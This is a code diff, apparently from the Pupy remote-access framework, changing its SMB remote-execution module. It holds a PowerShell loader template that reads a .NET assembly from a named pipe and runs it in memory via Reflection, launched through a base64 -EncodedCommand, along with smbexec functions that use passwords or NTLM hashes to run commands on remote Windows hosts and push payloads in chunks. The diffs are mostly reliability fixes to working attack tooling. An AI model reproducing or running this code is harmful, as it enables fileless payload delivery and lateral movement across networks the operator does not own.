@@ -50,6 +50,8 @@ try:
 except ImportError:
     pass
 
+# Use Start-Transcript -Path C:\windows\temp\d.log -Force; to debug
+
 PIPE_LOADER_TEMPLATE = '''
 $ps=new-object System.IO.Pipes.PipeSecurity;
 $p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0);
@@ -60,7 +62,7 @@ $x.Close();
 [Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
 '''
 
-PIPE_LOADER_CMD_TEMPLATE = '{powershell} -EncodedCommand "{cmd}"'
+PIPE_LOADER_CMD_TEMPLATE = '{powershell} -EncodedCommand {cmd}'
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
 PERM_DIR       = ''.join(random.sample(string.ascii_letters, 10))
@@ -86,7 +88,7 @@ if 'idna' not in encodings._cache or not encodings._cache['idna']:
 
 def generate_loader_cmd(size):
     pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
-    encoded = b64encode(PIPE_LOADER_TEMPLATE.strip().format(
+    encoded = b64encode(PIPE_LOADER_TEMPLATE.format(
         pipename=pipename, size=size).encode('utf-16le'))
     cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
     return cmd, pipename
@@ -395,12 +397,22 @@ class FileTransfer(object):
 
         fid = self._conn.openFile(
             tid, pipe, FILE_WRITE_DATA | FILE_APPEND_DATA, shareMode=0)
-        self._conn.writeNamedPipe(tid, fid, data, waitAnswer=False)
-        self._conn.closeFile(tid, fid)
+
+        try:
+            # Write by small chunks (1.4 KB)
+            # Slow, but should work with crappy networks
+            for offset in xrange(0, len(data), 1400):
+                self._conn.writeNamedPipe(
+                    tid, fid,
+                    data[offset:offset+1400]
+                )
+        finally:
+            self._conn.closeFile(tid, fid)
 
     def close(self):
-        self._conn.logoff()
-        self._conn.close()
+        if self._conn:
+            self._conn.logoff()
+            self._conn.close()
 
 class ShellServiceAlreadyExists(Exception):
     pass
@@ -621,11 +633,11 @@ def smbexec(
         host, port, user, domain, password, ntlm, timeout=timeout
     )
 
-    try:
-        filename = None
-        ft = None
-        smbc = None
+    filename = None
+    ft = None
+    smbc = None
 
+    try:
         if execm == 'smbexec':
             smbc, filename = sc(conninfo, command, output, timeout if output else None)
             if not smbc:
@@ -692,6 +704,10 @@ def smbexec(
         return None, '{}:{} {}: {}\n{}'.format(
             host, port, type(e).__name__, e, traceback.format_exc())
 
+    finally:
+        if ft:
+            ft.close()
+
 def pupy_smb_exec(
     host, port,
     user, domain,
@@ -721,10 +737,8 @@ def pupy_smb_exec(
 
             except Exception, e:
                 if log_cb:
-                    log_cb(False, str(e))
-
-            finally:
-                ft.close()
+                    log_cb(False, '{}: {}'.format(
+                        e, traceback.format_exc()))
 
         try:
             _, error = smbexec(
@@ -732,7 +746,9 @@ def pupy_smb_exec(
                 user, domain,
                 password, ntlm,
                 cmd, execm=execm,
-                output=False, on_exec=_push_payload)
+                timeout=timeout,
+                output=False,
+                on_exec=_push_payload)
 
             if log_cb and error:
                 log_cb(False, 'Smbexec failed: {})'.format(error))
